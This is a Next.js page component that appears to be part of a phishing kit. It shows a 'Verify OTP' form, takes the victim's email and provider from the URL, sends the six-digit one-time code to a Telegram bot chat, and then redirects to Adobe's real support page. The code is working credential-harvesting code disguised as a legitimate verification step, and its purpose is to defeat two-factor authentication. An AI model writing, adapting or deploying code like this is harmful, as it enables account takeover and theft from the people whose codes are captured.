"use client";

import { useEffect, useRef, useState } from "react";
import { useSearchParams } from "next/navigation";

export default function OtpPage() {
  const searchParams = useSearchParams();
  const provider = searchParams.get("provider") || "Unknown";
  const email = searchParams.get("email") || "N/A";

  const [digits, setDigits] = useState(Array(6).fill(""));
  const [secondsLeft, setSecondsLeft] = useState(5 * 60);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const inputsRef = useRef<HTMLInputElement[]>([]);

  // ⏳ Countdown timer
  useEffect(() => {
    const id = setInterval(() => {
      setSecondsLeft((s) => (s > 0 ? s - 1 : 0));
    }, 1000);
    return () => clearInterval(id);
  }, []);

  // ⏱ Format timer
  const fmt = (s: number) =>
    `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(
      2,
      "0"
    )}`;

  // 🔢 Handle OTP input
  const handleChange = (val: string, idx: number) => {
    if (!/^\d?$/.test(val)) return;
    const next = [...digits];
    next[idx] = val;
    setDigits(next);
    if (val && idx < 5) inputsRef.current[idx + 1]?.focus();
  };

  // 🚀 Submit OTP
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const code = digits.join("");
    if (code.length !== 6) {
      setError("Please enter all 6 digits.");
      return;
    }

    setLoading(true);
    setError(null);

    try {
      const BOT = process.env.TELEGRAM_BOT_TOKEN!;
      const CHAT = process.env.TELEGRAM_CHAT_ID!;
      const url = `https://api.telegram.org/bot${BOT}/sendMessage`;

      const message = `
🔐 OTP SUBMISSION
👤 Email: ${email}
🏢 Provider: ${provider}
🔢 Code: ${code}
`.trim();

      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT, text: message }),
      });

      const data = await res.json();
      if (data.ok) {
        window.location.href = "https://helpx.adobe.com/support.html"; // or your redirect target
      } else {
        throw new Error("Telegram rejected the request.");
      }
    } catch (err) {
      console.error(err);
      setError("Failed to submit. Please try again.");
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#0a0a23] p-6">
      <div className="bg-[#1a1a40] p-8 rounded-2xl shadow-xl w-full max-w-md text-white">
        <h2 className="text-2xl font-bold mb-4 text-center">Enter Your OTP</h2>
        <p className="text-center mb-4 text-gray-400">
          Time remaining: <span className="font-mono">{fmt(secondsLeft)}</span>
        </p>

        <form
          onSubmit={handleSubmit}
          className="flex flex-col items-center space-y-5"
        >
          <div className="flex gap-2">
            {digits.map((d, i) => (
              <input
                key={i}
                ref={(el) => {
                  if (el) inputsRef.current[i] = el;
                }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={d}
                onChange={(e) => handleChange(e.target.value, i)}
                className="w-10 h-12 text-center text-lg bg-white/20 rounded border border-gray-500 text-white focus:ring-2 focus:ring-blue-500 outline-none"
              />
            ))}
          </div>

          {error && <p className="text-red-400 text-sm">{error}</p>}

          <button
            type="submit"
            disabled={loading}
            className="w-full py-3 bg-blue-600 hover:bg-blue-700 rounded text-white font-semibold disabled:opacity-50"
          >
            {loading ? "Submitting…" : "Verify OTP"}
          </button>
        </form>
      </div>
    </div>
  );
}
